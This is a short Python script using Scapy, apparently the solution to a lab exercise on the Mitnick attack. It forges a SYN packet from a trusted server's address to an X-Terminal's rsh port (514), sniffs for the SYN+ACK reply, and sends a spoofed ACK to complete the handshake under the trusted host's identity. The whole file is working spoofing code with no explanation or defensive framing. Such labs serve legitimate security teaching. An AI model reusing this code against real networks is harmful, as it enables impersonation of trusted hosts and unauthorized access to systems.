#!/usr/bin/python3

from scapy.all import *

# X-Terminal
XT_IP   = '10.9.0.5'
XT_PORT = 514
# Trusted Server
TS_IP   = '10.9.0.6'
TS_PORT = 1023
ISN     = 0x123
FILTER  = 'tcp'

def send_syn():
    ip  = IP(src=TS_IP, dst=XT_IP)
    tcp = TCP(flags="S", seq=ISN, sport=TS_PORT, dport=XT_PORT)
    send(ip/tcp)
    print('SYN packet sent\n')

def spoof_ack(pkt):
    if(('S' in pkt[TCP].flags) and ('A' in pkt[TCP].flags)):
        print('**** Got SYN+ACK ****\n')
        SEQ = ISN + 1
        ACK = pkt[TCP].seq + 1
        ip  = IP(src=TS_IP, dst=XT_IP)
        tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
        send(ip/tcp)
send_syn()
pkt = sniff(iface='br-b40a80b811bf', filter=FILTER, prn=spoof_ack)